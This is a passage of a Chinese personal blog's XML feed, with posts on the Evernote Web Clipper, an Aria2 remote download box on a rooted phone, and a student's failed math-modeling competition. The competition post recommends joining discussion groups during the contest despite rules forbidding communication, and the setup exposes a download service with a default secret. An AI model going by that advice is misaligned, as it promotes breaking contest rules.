alt="1553258826492.png"></p><p><strong>Evernote Web Clipper：</strong>印象笔记的插件，主要就是剪贴网站内容。比如看到一篇有用的技术博客，可以把它直接导入到我们的印象笔记中去。如：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb57b451253d178d9c67c.png" alt="1553258885826.png"></p><p>这里不要脸的就以我的文章作为例子了。保存以后，打开印象笔记软件：就可以看到刚才保存的内容了。本来是想贴图的，但是刚才做演示的时候我的本月流量给用完了。。。尴尬。</p><p><img data-src="https://pic.superbed.cn/item/5cfbb57f451253d178d9c6c9.png" alt="1553259051596.png"></p><p>这里就贴一张以前保存下载的文章吧：</p><p><img data-src="https://pic1.superbed.cn/item/5cfbb582451253d178d9c70f.png" alt="1553259093685.png"></p>]]></content>
      
      
      <categories>
          
          <category> 知识理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旧手机再利用-基于Aria2的下载机</title>
      <link href="/archives/6b2122f5.html"/>
      <url>/archives/6b2122f5.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><blockquote><p>最近换手机，因为原来的旧手机（一加三）性能也还算行，所以就百度了一下看能不能把这台手机给用起来，发现搭建个<strong>基于aria的远程下载机</strong>比较有趣,于是乎就有了本篇文章。</p></blockquote><a id="more"></a><p>什么是Aria？</p><blockquote><p>aria2 is a lightweight multi-protocol &amp; multi-source command-line download utility. It supports <span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0hUVFA=" title="https://wiki.archlinux.org/index.php/HTTP">HTTP<i class="fa fa-external-link"></i></span>/<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0hUVFBT" title="https://wiki.archlinux.org/index.php/HTTPS">HTTPS<i class="fa fa-external-link"></i></span>, <span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0ZUUA==" title="https://wiki.archlinux.org/index.php/FTP">FTP<i class="fa fa-external-link"></i></span>, <span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0JpdFRvcnJlbnQ=" title="https://wiki.archlinux.org/index.php/BitTorrent">BitTorrent<i class="fa fa-external-link"></i></span> and <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTWV0YWxpbms=" title="https://en.wikipedia.org/wiki/Metalink">Metalink<i class="fa fa-external-link"></i></span>. aria2 can be manipulated via built-in <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvSlNPTi1SUEM=" title="https://en.wikipedia.org/wiki/JSON-RPC">JSON-RPC<i class="fa fa-external-link"></i></span> and <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvWE1MLVJQQw==" title="https://en.wikipedia.org/wiki/XML-RPC">XML-RPC<i class="fa fa-external-link"></i></span> interfaces. (抄自：<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL2FyaWEy" title="https://wiki.archlinux.org/index.php/aria2">https://wiki.archlinux.org/index.php/aria2<i class="fa fa-external-link"></i></span>)</p></blockquote><p>翻译一下就是:</p><blockquote><p>aria2是一个轻量级的下载工具，支持多协议（HTPP/HTPPS,FTP,BT,MetaLink)，通过JSON-RPC或XML-RPC进行配置。</p></blockquote><p>为什么要使用Aria？</p><ol><li>aria轻量，可以尝试同时用迅雷和aria下东西，观察内存占用，你会发现迅雷占用明显高于aria</li><li>aria跨平台，几乎所有平台都可以使用</li><li>用aria<strong>实现远程下载</strong>，使用NAS,路由器，或者旧手机都可以完成</li><li>破解百度网盘限速</li></ol><p>Aria有什么缺点？</p><ol><li>原Aria是纯命令行的，导致很多人望而止步，不过现在经过大神的开发，已经有很多优秀的web管理工具。</li><li>Aria不支持迅雷的专用链接</li><li>Aria的Bt下载速度很慢</li></ol><h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2. 准备工作"></a>2. 准备工作</h2><ol><li><p>一台root的Android机</p></li><li><p>Aria服务：Aria2cdroid或者Aria2Android（前者似乎在酷安市场已下架，但是在码云上有该软件的源码，有一定的Android编程知识的同学可以clone下来编译一下）</p></li><li><p>Aria控制器：不推荐使用酷安市场上的Aria2远程下载，该软件有个无限弹出连接主页面的bug。反之使用web控制端是个相当不错的选择。这里推荐使用：<span class="exturl" data-url="aHR0cDovL2V1Y2guZ290b2lwMS5jb20vYXJpYS1uZy8jIS9zdGF0dXM=" title="http://euch.gotoip1.com/aria-ng/#!/status">Ariang<i class="fa fa-external-link"></i></span></p></li><li><p>有了上述的几个东西已经可以实现在局域网中下载东西了，但是要做到外网远程控制我们的下载鸡必要做内网穿透才行，这里我用的是<span class="exturl" data-url="aHR0cHM6Ly93d3cubmdyb2suY2Mv" title="https://www.ngrok.cc/">Sunny-Ngork<i class="fa fa-external-link"></i></span>。</p></li><li><p>NeoTerm终端</p></li><li><p>BusyBox</p></li></ol><p><strong>以上大多数软件均可在酷安市场找到。</strong></p><h2 id="3-开始搭建"><a href="#3-开始搭建" class="headerlink" title="3.开始搭建"></a>3.开始搭建</h2><h3 id="3-1-root你的手机"><a href="#3-1-root你的手机" class="headerlink" title="3.1 root你的手机"></a>3.1 root你的手机</h3><p>这个我就不细说了，手机解锁-&gt;刷入twrp recovery-&gt; 刷入root包。</p><h3 id="3-2-开启你的Aria后台服务"><a href="#3-2-开启你的Aria后台服务" class="headerlink" title="3.2 开启你的Aria后台服务"></a>3.2 开启你的Aria后台服务</h3><p><img data-src="https://pic3.superbed.cn/item/5cfbb583451253d178d9c758.png" alt="Screenshot_20181101-142810.png"></p><p>打开Aria2（如果你下载的是Aria2Android，就打开Aria2Android）</p><p><img data-src="https://pic.superbed.cn/item/5cfbb58b451253d178d9c7e5.png" alt="Screenshot_20181101-142828.png"></p><p>点击右上角的的三角形，开启服务。</p><p><img data-src="https://pic2.superbed.cn/item/5cfbb58c451253d178d9c827.png" alt="Screenshot_20181101-142834.png"></p><p>记住下面的东西：<br>第一行的ip:192.168.43.122<br>第二行的Secret：123456（如果你没改的就是这个，另外Aria2Android的同学也注意一下是多少）</p><h3 id="3-3-打开Web控制"><a href="#3-3-打开Web控制" class="headerlink" title="3.3 打开Web控制"></a>3.3 打开Web控制</h3><p>打开网址：<span class="exturl" data-url="aHR0cDovL2V1Y2guZ290b2lwMS5jb20vYXJpYS1uZy8jIS9zdGF0dXMoKQ==" title="http://euch.gotoip1.com/aria-ng/#!/status()">Ariang<i class="fa fa-external-link"></i></span></p><p><img data-src="https://pic.superbed.cn/item/5cfbb58e451253d178d9c85f.png" alt="web1.png"></p><p><img data-src="https://pic1.superbed.cn/item/5cfbb58f451253d178d9c893.png" alt="web2.png"></p><p><img data-src="https://pic.superbed.cn/item/5cfbb590451253d178d9c8c4.png" alt="web3.png"></p><p>到这一步局域网中的下载机已经搭建好了，可以来试试效果。</p><p><img data-src="https://pic1.superbed.cn/item/5cfbb592451253d178d9c901.png" alt="web4.png"></p><p>先不用在意我这里的网速。。。（如果你搭建成功，并且下载的是http的文件速度基本上是满速的）</p><h3 id="3-4-内网穿透"><a href="#3-4-内网穿透" class="headerlink" title="3.4 内网穿透"></a>3.4 内网穿透</h3><p>到上一步为止都还是非常容易的，但是实用性还不算高，毕竟在局域网直接用控制端的主机来下载不就好了吗，或者每次出门前就把要下载的东西设置好。不过要是能够远程控制不是更美好吗？</p><h4 id="3-4-1-配置环境"><a href="#3-4-1-配置环境" class="headerlink" title="3.4.1 配置环境"></a>3.4.1 配置环境</h4><p>打开<strong>busybox</strong>，给root权限，<strong>等加载进度条跑完</strong>，然后选择install就行了。</p><h4 id="3-4-2-Sunny-Ngork配置"><a href="#3-4-2-Sunny-Ngork配置" class="headerlink" title="3.4.2 Sunny-Ngork配置"></a>3.4.2 Sunny-Ngork配置</h4><p>打开<span class="exturl" data-url="aHR0cHM6Ly93d3cubmdyb2suY2Mv" title="https://www.ngrok.cc/">Sunny-Ngork<i class="fa fa-external-link"></i></span>官网，注册一个账号进入到后台：</p><p><img data-src="https://pic.superbed.cn/item/5cfbb594451253d178d9c93b.png" alt="web5.png"></p><p><img data-src="https://pic.superbed.cn/item/5cfbb595451253d178d9c973.png" alt="web6.png"></p><p><img data-src="https://pic.superbed.cn/item/5cfbb596451253d178d9c9b6.png" alt="web7.png"></p><p><img data-src="https://pic.superbed.cn/item/5cfbb598451253d178d9c9ee.png" alt="web8.png"></p><p><strong>将下载下来的linux arm文件放到手机里，并记住放置的目录,并解压，会得到一个名字为sunny脚本</strong></p><h4 id="3-4-3-运行外网穿透程序"><a href="#3-4-3-运行外网穿透程序" class="headerlink" title="3.4.3 运行外网穿透程序"></a>3.4.3 运行外网穿透程序</h4><p>打开<strong>NeoTerm</strong>终端，获取超级权限:<code>su</code>，会提示给权限。</p><p>cd到上一步中你解压的脚本目录下:<code>cd xxxx</code></p><p>把sunny文件移动到/system层级下（不移动到这个层级下无法更改该文件的权限）:<code>mv sunny /system</code></p><p>cd到system目录:<code>cd /system</code></p><p>更改sunny文件权限：<code>chmod 755 sunny</code></p><p>运行:<code>sunny clientid 隧道id</code></p><p>如果配置成功应该由如下界面:</p><p><img data-src="https://pic.superbed.cn/item/5cfbb599451253d178d9ca24.png" alt="Screenshot_20181101-150632.png"></p><h4 id="3-4-4-更新远端控制程序"><a href="#3-4-4-更新远端控制程序" class="headerlink" title="3.4.4 更新远端控制程序"></a>3.4.4 更新远端控制程序</h4><p><img data-src="https://pic.superbed.cn/item/5cfbb59b451253d178d9ca5b.png" alt="web9.png"></p><p>端口一定要填80端口!</p><p>端口一定要填80端口!</p><p>端口一定要填80端口!</p><p>嗯，到这里我们就完成了远程端搭建，快去试试吧。</p><h2 id="4-额外的问题"><a href="#4-额外的问题" class="headerlink" title="4.额外的问题"></a>4.额外的问题</h2><ol><li><p><strong>怎么用aria怎么下载百度网盘里的资源？</strong></p><p>可以用chrome的插件BaiduExporter，但是chrome商店已经下架了，好在该插件在github上有，这里贴出地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FjZ290YWt1L0JhaWR1RXhwb3J0ZXI=" title="https://github.com/acgotaku/BaiduExporter">https://github.com/acgotaku/BaiduExporter<i class="fa fa-external-link"></i></span></p></li></ol><p><img data-src="https://pic.superbed.cn/item/5cfbb59c451253d178d9ca97.png" alt="web10.png"></p><p>把这个下载下来，然后打开chrome的扩展程序，拖进去。<strong>嗯，完美的没有安装成功</strong>，chrome限制了没有在商店上线的插件。</p><p>正确的做法是，把crx后缀该为rar，然后解压，最后在chrome的扩展程序中<strong>加载已解压程序</strong>，就ok了。</p><p>使用方法，找到资源，点击导出下载，推送到aria（可能需要设置一下，和ariang面板差不多，就不说了）</p><p><img data-src="https://pic.superbed.cn/item/5cfbb59e451253d178d9cadb.png" alt="web11.png"></p><ol start="2"><li><strong>为什么我的aria下载bt，磁力没速度，但是迅雷却跑得很快？</strong></li></ol><p>根据我百度的资料来看（<strong>不一定准确</strong>），迅雷之所以跑得快，是因为迅雷流氓，在后台上传你下载的文件信息。我们都知道bt下载需要去别人手中取文件块，所以人越多下载得越快，迅雷这样做就导致很容易发现其他下载者，而aria就不行了。至于为什么aria速度完全没有的情况，是因为没有配置bt-tracker：把下面这些复制到你的bt-tracker中（在ariang面板中的bt设置中有这个选项）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">udp:&#x2F;&#x2F;tracker.coppersurfer.tk:6969&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;tracker.opentrackr.org:1337&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;9.rarbg.to:2710&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;tracker.internetwarriors.net:1337&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;exodus.desync.com:6969&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;tracker.vanitycore.co:6969&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;public.popcorn-tracker.org:6969&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;explodie.org:6969&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;tracker1.itzmx.com:8080&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;tracker.torrent.eu.org:451&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;tracker.tiny-vps.com:6969&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;tracker.port443.xyz:6969&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;thetracker.org:80&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;open.stealth.si:80&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;open.demonii.si:1337&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;ipv4.tracker.harry.lu:80&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;denis.stalker.upeer.me:6969&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;bt.xxx-tracker.com:2710&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;tracker.cypherpunks.ru:6969&#x2F;announce</span><br><span class="line"></span><br><span class="line">udp:&#x2F;&#x2F;retracker.lanta-net.ru:2710&#x2F;announce</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>不过，tracker更新的很快，当你看到这篇文章的时候，应该已经过时了</strong>，所以这里贴出一个trakcer更新的仓库，需要的时候自己去看看吧:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25nb3NhbmcvdHJhY2tlcnNsaXN0" title="https://github.com/ngosang/trackerslist">https://github.com/ngosang/trackerslist<i class="fa fa-external-link"></i></span></p><p>每次更改设置后，<strong>记住重启aria服务</strong>。</p><p>好了，愉快的去享受远程下载吧。hiahia。</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手机 </tag>
            
            <tag> 下载机 </tag>
            
            <tag> aria2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一份失败的数学建模心得</title>
      <link href="/archives/5c3da6c9.html"/>
      <url>/archives/5c3da6c9.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>今天是<strong>2018/09/06</strong>，好像又快到数学建模国赛的日子了。一直觉得自己应该写点东西，但又觉得自己还是不够资格，毕竟在数学建模上的建树不多甚至很差。但是还是想把自己的一些经验分享给即将参加国赛的学弟学妹吧。我想在此之前你已经看过很多国赛一等二等大佬们的经验分享，所以如果想换个口味，我这种建模loser的文章也可以看看，就当玩咯，反正也花不了多少时间。</p><p>不过成功的案例，我还是推荐一个帮助过我很多的学长的经验分享–<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81NmQxZWU4NTdlZTk=" title="https://www.jianshu.com/p/56d1ee857ee9">我的零经验数模路<i class="fa fa-external-link"></i></span></p><p>不想看多余的废话的，可以直接跳到–<a href="#4">超多干货分享</a></p><a id="more"></a><h2 id="2-我的数学建模经历"><a href="#2-我的数学建模经历" class="headerlink" title="2.我的数学建模经历"></a>2.我的数学建模经历</h2><blockquote><p>为什么我要参见数学建模竞赛？</p></blockquote><p>因为这个竞赛是我所在学校获取保研资格的竞赛之一。虽然我承认数学建模的过程中的确能获得很多知识，不过不好意思，最初始的目的就是为了保送研究生。</p><p>我的角色：coder</p><h3 id="2-1初遇数学建模"><a href="#2-1初遇数学建模" class="headerlink" title="2.1初遇数学建模"></a>2.1初遇数学建模</h3><p>初次遇见数学建模竞赛是在大一下的举行的校数学建模竞赛，听说了这个比赛的重要程度（当然不是校赛就能保研，校赛只是用于选拔），加上收到当时所在协会的学姐的鼓励（啥也不会，只用Excel就得了个二等奖)，所以和同室友马上就参加了。拿到题目后直接傻眼了，我记得当时是从”深圳垃圾处理“、”水能节源减排“和“生物医疗”的题目选择一道，不过当时确实什么都不会，首先就上贴吧啊，论坛啊之类的搜答案去了，结果也可想而之–<strong>全是卖论文的</strong>，关于“网上共享答案”这一点我会在<a href="#3">之后</a>给出我的一点点小建议。最后大一的校内比赛不了了之了。</p><p><strong>收获:</strong></p><ul><li>像个傻逼一样地体验了一把数学建模</li></ul><h3 id="2-2-再遇数学建模"><a href="#2-2-再遇数学建模" class="headerlink" title="2.2 再遇数学建模"></a>2.2 再遇数学建模</h3><h4 id="2-2-1-学习阶段"><a href="#2-2-1-学习阶段" class="headerlink" title="2.2.1 学习阶段"></a>2.2.1 学习阶段</h4><p>转眼就到了大二下，为了不走大一的老路，从大约2017年4月中下旬开始，拿了一两本MATLAB和lingo的书每天呆在实验室啃。系统学习完MATLAB（现在，我不推荐学习lingo，因为有更好的替代品–<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9lMWM0NWIzZDhkOGE=" title="https://www.jianshu.com/p/e1c45b3d8d8a">yalmip<i class="fa fa-external-link"></i></span>，当然已经学习了的肯定是不错的，毕竟各有各的优点)，就向国一学长借了两本数学建模的书籍正式刚模型。同时，和同实验室的一个朋友组好了队，一起学习数学建模，等着6月的校内选拔赛。</p><h4 id="2-2-2-校内选拔"><a href="#2-2-2-校内选拔" class="headerlink" title="2.2.2 校内选拔"></a>2.2.2 校内选拔</h4><p>不久后，6月校内选拔赛开始了，虽然没能学习完两本书，但是一些基本模型是掌握了的。这次的题目有”钢结构优化“，”宜居城市评定“和”深圳垃圾处理”（垃圾处理真是热门。。。）。拿到题目后，稍微文献分析了一下，第一题和建筑物理有关，不大适合就干脆放弃了。第三题数据量没做过处理就没做了。锁定了最简单的第二题后，准备开干。</p><p><em>然而，这个时候，一个队友有事回家，另一个队友却说想打篮球晚点来。。。。其实当时心里真的是哔了dog的感觉，毕竟准备了挺长的时间而且也是很重要的一个比赛</em>。</p><p>虽然比赛时间为一周，但是这一周也要上课嘛。不过咬咬牙自己单干了一两天，差不多把文献资料整理了一下，分析了一些重要的文献。比赛结束的前一晚，请学长过来帮忙看了看，终于完成了第一份数学建模的论文。</p><p>大约两周后，成绩下来了，不过很遗憾的是，只得到了建模二等奖。</p><p><strong>阶段分工：</strong></p><ul><li>我负责编程：掌握MATLAB，lingo，会查阅一些简单资料，excel绘图，数据搜索</li><li>team member1: 掌握SPSS，会写部分论文，整体上进行建模，数据搜索，excel绘图</li><li>team member2: 论文编写，数据搜索，文献查看</li></ul><p><strong>阶段收获：</strong></p><ul><li>系统地学习了MATLAB和Lingo</li><li>掌握了一些基础的数学模型</li><li>完成了第一份数学建模论文</li></ul><h3 id="2-3-数模培训集中营"><a href="#2-3-数模培训集中营" class="headerlink" title="2.3 数模培训集中营"></a>2.3 数模培训集中营</h3><h4 id="2-3-1-背景"><a href="#2-3-1-背景" class="headerlink" title="2.3.1 背景"></a>2.3.1 背景</h4><p><strong>学校背景：</strong></p><ul><li>数学建模一直都是我们学校重视的竞赛，前文也说到了这个比赛可保研，学生们也很积极。所以每年通过校赛选拔后的参赛队都会参加学校为期半个月的数模培训+3次模拟训练</li></ul><p><strong>我的情况：</strong></p><ul><li>可能对二等奖的结果不满意吧，加上之前单干过一阵子所以心情不大好，就找了个年级第一的大佬，加入了他们队。</li></ul><p><strong>培训方式：</strong></p><ul><li>半月培训：学校数理院的老师们会对学生们”全面洗脑“,传授大部分的数学模型，对优秀论文进行分析。<strong>（不过这个阶段真的是很枯燥，收获并不多，不如自己看书来得快）</strong></li><li>中途会放假很长一段时间，具体时间忘了，不过就我本人来说大约玩了个10天。这个阶段布置了第一套模拟题（当然，和队友们约定这个阶段不看题目，只管玩）</li></ul><h4 id="2-3-2-第一套模拟题"><a href="#2-3-2-第一套模拟题" class="headerlink" title="2.3.2 第一套模拟题"></a>2.3.2 第一套模拟题</h4><p>浪完了后，回到学校正式解决第一套题目，这次题目有：“能源相关的题目”，”交通分析”，“快递派送”。因为受到学长论文的影响，很喜欢元胞自动机模型（学长论文中就是使用元胞自动机模型），这个模型很适合做交通类别的题目，所以选择了第二题，依葫芦画瓢的想搬过来用用，使用这个模型大约一下午+一晚上。晚上走的时候决定放弃了，在编程实现的时候，堵塞等待，红路灯时间设置，转向等问题不好实现，所以放弃了。</p><p>之后转向了<strong>VISSIM（交通仿真软件）</strong>学习，大约花了两到三天掌握了VISSIM的基本功能，队友们也将模型建立好了就等实现。不过，<strong>最后实现的效果并不好–有红绿灯反而使得交通更拥堵了</strong>。这样一来，所有工作全部废掉了，心情很是沮丧，和队友反复检验哪里有问题，到最后也没发现什么问题，因为不设置红绿灯时，汽车自己懂得避让然后转向。所以无奈，<strong>重新选题</strong>（这个时候距离第一次训练交卷大约还剩一个星期）。</p><p>之后选择了“快递派送”题目，这个题目做起来就很顺手了，一天半基本上就解决了所有问题。之后就是修改论文，对team member2写完的论文进行仔细推敲，反复修改，甚至是重写。因为特别想写好，所以这套题目花费了3-4天3个人同时写、修改论文。最后交卷并且去听了讨论会（每套题目，都会让完成组去分享）。</p><p><strong>结果：</strong></p><ul><li>我们的论文：老师觉得写得很不错，基本没有什么需要修改的地方，当然还有细节修改。（信心倍增，但是自己也明白这样写，国赛时间根本不够）</li><li>别人的论文（因为是第一套题目，就没有去分享自己的论文写作，只听了听别人的）：<ul><li>“交通分析”：发现了一个队和我们之前的想法完全一致（因为查到了相同的论文），**那么为什么别人做出来了，我们没做出来?**最后发现是在设置VISSIM时，对方编程的同学关闭了车辆变道选项，大大降低了拥塞率。</li><li>“快递派送”：这道题目比较简单，不过有人居然做了“灵敏性分析”，这点我们组倒是没有想到。</li></ul></li></ul><p><strong>收获：</strong></p><ul><li>实际使用了自己学习过的一些模型</li><li>掌握新软件VISSIM</li><li>注意“灵敏性分析”（这一点还是很重要的，国赛里面也是一个分值点）</li><li>提升团队默契度</li></ul><h4 id="2-3-3-第二套和第三套题目"><a href="#2-3-3-第二套和第三套题目" class="headerlink" title="2.3.3 第二套和第三套题目"></a>2.3.3 第二套和第三套题目</h4><p><strong>第二套：</strong></p><ul><li><p>第一套结束后，休息了一天就开始了第二套，这次又选择了一个“派送优化”类型的题目（这是一个错误的决定，即使我们学到了一些东西）。第二套题目是最累的一次训练，因为要解决的问题很多，但时间一共4天，最后我们完成的论文差不多有60页。</p></li><li><p>对启发式算法进行了实际运用，学习了<strong>yalmip</strong>(强烈建议学习这个东西，优化类型的题目真的很好用)</p></li><li><p>对比了别人做的方案，我们发现我们的模型还是相当不错的，本来想去分享的，但是还没走上台其他人就冲上去了。所以这次也没能分享。</p></li></ul><p><strong>第三套：</strong></p><ul><li>照样地，第二套结束后，休息了一天又开始了第三套，选择了“银行收支分析”的一个题目，然而从未做过数据分析的我们显得特别地力不从心，对很多数据处理好后都不知道怎么分析，绘制好的图也不知道怎么去描述。<strong>最后这道题没有做完。</strong>（大家都很累了，信心都很受挫，甚至第三套结束后，我还提议去做第四套，不过做了半天后就放弃了，因为实在太累了）</li><li>了解了我们不擅长数据处理（应该说除了优化类型题目，我们对其他领域都比较陌生）。</li><li>听完了别人的分享，发现其实也不是很难，但是为什么我们当时就没想到呢。</li></ul><h4 id="2-3-4-训练结束"><a href="#2-3-4-训练结束" class="headerlink" title="2.3.4 训练结束"></a>2.3.4 训练结束</h4><p>训练结束了，收获到很多东西，书上的内容基本都看完了，基本上每行代码都看了敲了，但是却没什么信心（这大概也在预兆了我们的失败）。结束训练后，大概也开学了，这期间对所有模型进行了总结归类，写论文的同学也对模板进行了重排版，购买好零食，电脑做完清理，等等xxx。反正<strong>这段时间就是在为国赛做好准备</strong>。</p><h3 id="2-4-国赛开始！"><a href="#2-4-国赛开始！" class="headerlink" title="2.4 国赛开始！"></a>2.4 国赛开始！</h3><p>2017年的国赛是晚上8点开始的，拿到题目后，首先还是题目分析。不过我们组很简单了，收到第三套题目的影响，B题是一道数据处理类型的题目，所以1个多小时就pass了(反观隔壁组大约花了3-4个小时选题)，就做起了A题“CT图像复原”。</p><p><strong>过程：</strong></p><ul><li>国赛的过程很难受，我们花了大约2天才解决第一题，全员除了第一天睡了大约6-7个小时，后来的三天每天睡眠都在3-4小时内，到了第三天下午我们才解决第2题的三分之二。<strong>到了第三天晚上（凌晨就是交卷的时候），虽然之前就觉得做不完了，但是这个时候我们更确定自己做不完了。队员们的情绪都很不好，我和年级第一的大佬发生了解题意见上的冲突，因为一些很杂碎的事情，我也对写论文的队员发了脾气（这里真的很对不起两位队员）</strong>，最后，简单整理了第二题，第三题和第四题时终于还是去网络上搜查了一些答案，加入了一些讨论群（这个工作本应该在国赛前做的），然后加上自己的想法写在了论文里，写完时已经第二天的5点过了，赶在了6点前（交论文的最后时间）提交了。</li></ul><p><strong>一点小感悟：</strong></p><ul><li>虽然我们花了两天才解决第一题，但是后来翻看论文时，发现我们做得实在是太细了，一些基本定理（一条固定斜率的直线，切椭圆时，过中点的弦长最长这种定理我们全部采用了理论和程序去证明，最后也花费了很多时间在作图上），所以我强烈的建议即将参赛的学弟学妹们别走我们的老路。</li></ul><p><strong>结果：</strong></p><ul><li>不出意外的，啥也没有。（得到这样的结果时，当时真的挺难受的，不过我们确实很多地方没有做好）</li></ul><p><em>不甘心的我，在一学期之后又继续组队参加了美赛，不过结果还是不好，我也就不废话了。</em>下面就综合我个人的感受给大家一些建议吧：</p><h2 id="3-一些小小的建议"><a href="#3-一些小小的建议" class="headerlink" title="3.一些小小的建议"></a>3.一些小小的建议</h2><ol><li><p>先给队里的程序员：<strong>别去优化你的程序</strong>，不要想着去抽象、简化代码，这样没有任何意义，反而浪费了很多时间。</p></li><li><p>再给所有队员们：只要不是特别过分的错误，任何时候都<strong>别去责怪你的队员</strong>，题目困难，大家都是一样的，所以撸起袖子加油干吧！！！</p></li><li><p>在平常训练的时候，不要只做擅长的类型，既然是训练就应该<strong>涉猎广一点</strong>。</p></li><li><p>团队的配合真的很重要，<strong>一个人的实力再强也没什么用</strong>，因为你的精力和时间都是有限的，合理的对全队分工才是真正重要的。<strong>一个团队应该选择一个有决定权力的队长来管理分工团队</strong>。</p></li><li><p>放宽心态：别因为一时的错误，失败，贬低就没了自信，很多时候有自信才能做好这个工作，看我们团队和学长的团队这就是很大的区别（<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81NmQxZWU4NTdlZTk=" title="https://www.jianshu.com/p/56d1ee857ee9">学长文章<i class="fa fa-external-link"></i></span>)。</p></li><li><p>适当加入一些网上的讨论群（虽然比赛大纲里说了不允许交流，但是私下交流其实蛮重要的，毕竟我们团队就是太过封闭，完全自己动手解决也是蛮痛苦的），但是一定不要依赖这个，而是在你们一筹莫展的时候有时候能找到一些突破点。</p></li><li><p>适当地进行放松，合理地时间规划：这个得根据你们平时训练时的节点进行安排，我觉得没有固定的时间节点，因为每个团队都是不一样的，每个人的精力也都是不一样的。但是尽量让团队中的三个人一起工作一起休息，这样能够更好的发挥效率，另外结合我的经历，我不鼓励体力战术，因为实在是太累了，效率也相当低下。</p></li><li><p>如果不是特别擅长精确类型的题目，尽量选择模糊类型题目，这样更容易获得好成绩（美赛经验，当然国赛也适合）。</p></li></ol><p>差不多就这些，虽然大部分是鸡汤，但是其实这些所谓的鸡汤也真的很重要。最后，就来分享一大堆干货吧。</p><h2 id="4-超多干货分享"><a href="#4-超多干货分享" class="headerlink" title="4.超多干货分享"></a>4.超多干货分享</h2><h4 id="搜索引擎的正确使用姿势："><a href="#搜索引擎的正确使用姿势：" class="headerlink" title="搜索引擎的正确使用姿势："></a>搜索引擎的正确使用姿势：</h4><blockquote><p>第一，也是非常重要的前提，<strong>请一定要能翻墙</strong>。</p></blockquote><p>如果你还不能翻墙，要么去买VPN，要么也可以使用chrome的插件（chrome内核系的浏览器都可以用）–<strong>谷歌访问助手</strong>：</p><p>链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXpzU2tVZ0wtbTdwcXdYZG1lYjJvdkE=" title="https://pan.baidu.com/s/1zsSkUgL-m7pqwXdmeb2ovA">https://pan.baidu.com/s/1zsSkUgL-m7pqwXdmeb2ovA<i class="fa fa-external-link"></i></span> 